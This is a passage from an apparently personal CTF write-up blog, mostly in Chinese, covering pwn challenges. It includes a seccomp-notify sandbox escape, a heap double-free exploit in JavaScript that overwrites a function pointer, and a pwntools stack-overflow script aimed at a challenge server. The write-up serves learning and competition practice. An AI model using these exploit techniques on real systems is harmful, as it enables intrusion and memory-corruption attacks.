sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleNotifications</span><span class="hljs-params">(<span class="hljs-keyword">int</span> notifyFd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-keyword">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;)<br>  &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR)<br>        <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat)<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>], req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">supervisor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readBinary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sz, readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;sz);<br>  <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-keyword">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>, O_WRONLY | O_CREAT, <span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span> (sz &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    readed = read(<span class="hljs-number">0</span>, buf, sz);<br>    write(f, buf, readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// #include &lt;unistd.h&gt;</span><br><span class="hljs-comment">// #include &lt;asm/unistd.h&gt;</span><br><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_3.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.34&quot;);</span><br><br><br><span class="hljs-keyword">void</span> __libc_start_main()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// void puts_impl()&#123;</span><br><span class="hljs-comment">//     asm(&quot;.intel_syntax noprefix&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov rax,1&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov qword ptr [rax],1&quot;);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="map"><a href="#map" class="headerlink" title="map:"></a>map:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*GLIBC_2.34 &#123;</span><br><span class="hljs-comment">        global: __libc_start_main;puts;</span><br><span class="hljs-comment">        local:  *;      # Hide all other symbols</span><br><span class="hljs-comment">&#125;;*/</span><br>GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span> &#123;<br>        global: __libc_start_main;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br></code></pre></div></td></tr></table></figure>



<h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution 3 - ?"></a>solution 3 - ?</h3><blockquote>
<p>team solution</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execlp(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;LD_DEBUG=all sudo&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>然后呢? 没看懂</p>
<p>呃呃感觉是上一种方法的一个步骤, </p>
<ul>
<li>LD_DEBUG能打印出ld在加载共享库时的信息, 包括符号信息. </li>
<li>PR_SET_NO_NEW_PRIVS让之后的exec执行的新程序无法通过简单的setgid或者修改文件权限获得新的权限. </li>
</ul>
<h2 id="jsy"><a href="#jsy" class="headerlink" title="jsy"></a>jsy</h2><p>最短的一个exp, 最长的有几千行不知道在写啥. 最短的也不知道在写啥. </p>
<p>发现了文档, 原来是一个js解释器, 是一个现成的项目. 那个patch是真是存在的一个漏洞吗? 这代码量也太大了….js也不怎么会…</p>
<blockquote>
<p>patch里加的free可以double free，2.35的glibc，可以通过占位控制某个header实现任意地址读写</p>
<p>没有Buffer，可以用Array，header大小应该是0x90</p>
<p>Array被free时，貌似只有header被free了，body不会被free</p>
</blockquote>
<h3 id="zanderdk的解释"><a href="#zanderdk的解释" class="headerlink" title="@zanderdk的解释:"></a>@zanderdk的解释:</h3><p>Short explanation: We use quite to create a object of type JS_CCFUNCTION which will have c union type bellow:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">js_Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> noTcacheOverwrite[<span class="hljs-number">0x18</span>]; <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">js_Class</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-keyword">int</span> extensible;<br>    js_Property *properties;<br>    <span class="hljs-keyword">int</span> count; <span class="hljs-comment">/* number of properties, for array sparseness check */</span><br>    js_Object *prototype;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>....<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>            js_CFunction function;<br>            js_CFunction constructor;<br>            <span class="hljs-keyword">int</span> length;<br>            <span class="hljs-keyword">void</span> *data; <br>            js_Finalize finalize;<br>        &#125; c;<br></code></pre></div></td></tr></table></figure>

<p><code>js_CFunction function;</code> is a function pointer. We then free this object (target in hax.js) but keep a refrence to this object and we allocate it back using: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">S_fromCharCode</span><span class="hljs-params">(js_State *J)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, top = js_gettop(J);<br>    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">volatile</span> s = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *p;<br>    Rune c;<br>    <span class="hljs-keyword">if</span> (js_try(J)) &#123;<br>        js_free(J, s);<br>        js_throw(J);<br>    &#125;<br>    s = p = js_malloc(J, (top<span class="hljs-number">-1</span>) * UTFmax + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; top; ++i) &#123;<br>        c = js_touint32(J, i);<br>        p += runetochar(p, &amp;c);<br>    &#125;<br>    *p = <span class="hljs-number">0</span>;<br>    js_pushstring(J, s);<br>    js_endtry(J);<br>    js_free(J, s);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>then we partialy overwrite the function pointer with the addres of static void jsB_read(js_State *J) which will put the content of a file into a JS string.  The problem here is the <code>*p = 0;</code>  in the C above, as it will insert null terminator in the address. Sooo we just run it enough times for ALSR to pick a address with 0 at that position in the address. also runetochar do some utf8 magic to some of the bytes we put in if outside of ascii range. so prop a bit more than 255 actually. </p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">JS_CCFUNCTION = <span class="hljs-number">4</span> <span class="hljs-comment">/* built-in function */</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>    a += <span class="hljs-string">&quot;\x08&quot;</span>;<br>&#125;<br><span class="hljs-keyword">var</span> thingy = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy1 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy2 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy3 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy4 = &#123;&#125;;<br><span class="hljs-keyword">var</span> target = quit;<br><span class="hljs-keyword">var</span> over = <span class="hljs-string">&quot;A&quot;</span>;<br>free(target);<br>free(thingy);<br>a.toLowerCase();<br><br><span class="hljs-keyword">var</span> a = ((target.length) &amp; <span class="hljs-number">0xffffff</span>) - <span class="hljs-number">0x2c2</span>;<br>print(a);<br><br>lol = <span class="hljs-built_in">String</span>.fromCharCode(<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    JS_CCFUNCTION, <span class="hljs-comment">/* +0x18 */</span><br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* +0x1c : extensible */</span><br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* count  */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x0800</span>,      <span class="hljs-comment">/* prototype  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-comment">// partial overwrite start here</span><br>    a &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>)<br><br>print(target(<span class="hljs-string">&quot;/flag.txt&quot;</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>-- EOF --<br></code></pre></div></td></tr></table></figure>

<h2 id="Escape-maze"><a href="#Escape-maze" class="headerlink" title="Escape maze"></a>Escape maze</h2><p>还没看过. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>conn=remote(<span class="hljs-string">&quot;65.21.255.31&quot;</span>,<span class="hljs-number">34979</span>)<br>r=<span class="hljs-string">b&#x27;0&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    u=conn.recvuntil(<span class="hljs-string">b&#x27;key number:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(u)<br>    nr=u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">2</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">8</span>].replace(<span class="hljs-string">b&#x27;,&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> nr!=r:<br>        conn.sendline(nr)<br>        r=nr<br>    <span class="hljs-keyword">else</span>:<br>        conn.sendline(u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure>



<h1 id="CSR-2022"><a href="#CSR-2022" class="headerlink" title="CSR 2022"></a>CSR 2022</h1><h2 id="PWNMEPLX"><a href="#PWNMEPLX" class="headerlink" title="PWNMEPLX"></a>PWNMEPLX</h2><blockquote>
<p>CSR 2022</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">┌──(root💀kali)-[/mnt/LearingList/CTF/PWNMEPLX]<br>└─# checksec pwn             <br>[*] &#x27;/mnt/LearingList/CTF/PWNMEPLX/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></div></td></tr></table></figure>

<p>这个是取绝对值的x64汇编写法: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401336 8B 45 8C                                   mov     eax, [rbp+var_74]<br>.text:0000000000401339 99                                         cdq<br>.text:000000000040133A 89 D0                                      mov     eax, edx<br>.text:000000000040133C 33 45 8C                                   xor     eax, [rbp+var_74]<br>.text:000000000040133F 29 D0                                      sub     eax, edx<br>.text:0000000000401341 C9                                         leave<br>.text:0000000000401342 C3                                         retn<br></code></pre></div></td></tr></table></figure>

<p>简单的栈溢出覆盖返回地址居然因为&lt;__vfscanf_internal+133&gt;处的xmmword需要0x10字节对齐而出错…….</p>
<p>简单的不想多说. 但是还是做了好一会儿, 还在想是不是符号/浮点数的问题, 结果就是一个简单的后门栈溢出.</p>
<p>这个比赛的pwn题全都是签到, 差点意思. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv one</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>sla=lambda x,y:p.sendlineafter(x,y)<br>itt=lambda :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./pwn.elf64&quot;</span>)<br><br>payload = b<span class="hljs-number">&#x27;b</span><span class="hljs-number">&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">8</span>) + pack(<span class="hljs-number">0x401348</span>, <span class="hljs-number">64</span>)<br>sl(b<span class="hljs-string">&quot;-1&quot;</span>)<br>sl(payload)<br>itt()<br></code></pre></div></td></tr></table></figure>

<h2 id="PWNFORTRESS"><a href="#PWNFORTRESS" class="headerlink" title="PWNFORTRESS"></a>PWNFORTRESS</h2><blockquote>
<p>同上, 不过题目是rev+game. 基本不会</p>
</blockquote>
<p>主要问题是明确了glibc版本, 但是ubuntu的2.3几之后的全都是用.zst压缩, dpkg无法解压, 改成了清华源中debian的glibc库, 然后dbg版本的包里面也没有带符号的库文件. 不知道怎么用了, 分析了半天glibc-all-in-one代码不知道怎么改, 索性就没有符号吧. 不过在ubuntu2022里直接运行. </p>
<p>debian glibc file <a target="_blank" rel="noopener" href="https://packages.debian.org/source/bookworm/glibc">catagory</a> | <a target="_blank" rel="noopener" href="https://mirror.tuna.tsinghua.edu.cn/debian/pool/main/g/glibc/">tuna</a> mirror site</p>
<p>不会做. </p>
<p>unintended solution:</p>
<p>breakpoint before the level is printed, make it print the last level instead, it will segfault, but the decoded map is in memory</p>
<hr>
<p>随便看到一题都有三个标签, cry, misc, pwn, 没接触过的加密和杂项, 属实不会, 还有一些虚拟机逃逸加上什么RISC-JIT之类没听说过的技术. 到处都是知识盲区.</p>
<h1 id="Hackergame-2022"><a href="#Hackergame-2022" class="headerlink" title="Hackergame 2022"></a>Hackergame 2022</h1><p>简单题略过了, 不太想花时间. 能做的学不到东西, 能学到的基本不会做. </p>
<p>猫咪问答: 懒得做. 旅行图片: 社工懒得做. 纯耗时间. </p>
<p>签到: mousedown的事件监听的touchStart函数加上一个logpoint让lefttime不变</p>
<p>HeiLang: 无聊的语法转换</p>
<p>Flag自动机: 是window程序, 看了看IDA的反编译代码后发现有消息回调函数, 在cheat engine里让x, y变得不随机, 然后改一个变量进入flag生成. </p>
<h2 id="One-byte-man"><a href="#One-byte-man" class="headerlink" title="One-byte-man"></a>One-byte-man</h2><p>挺神奇的, 代码里面又是还没看的linux概念………</p>
<ul>
<li><p>prctl参数<code>PR_SET_CHILD_SUBREAPER</code>: 设置进程树属性, 使得树中孤儿被收养到最近的<strong>设置了属性的</strong>父进程处.<br>因为该属性<strong>只能通过</strong>execve继承而非fork和clone. </p>
</li>
<li><p>认真看了下namespace的man page. <code>CLONE_NEW*</code>一系列flag.  </p>
</li>
<li><p>user_namespace: A process’s user and group IDs can be different inside and outside a user namespace. </p>
<ul>
<li>namespace是一个树状继承图. 像是setns和unshare和clone可以开辟新的子namespace</li>
<li><strong>User and group ID mappings: uid_map and gid_map</strong> <ul>
<li>root namespace的两个文件中可以见到<code>0          0 4294967295</code>, 第三个是有符号数的-1, 其实是指一个length, 这一段的uid都被map了. Since Linux 4.15每个进程可有340行映射. </li>
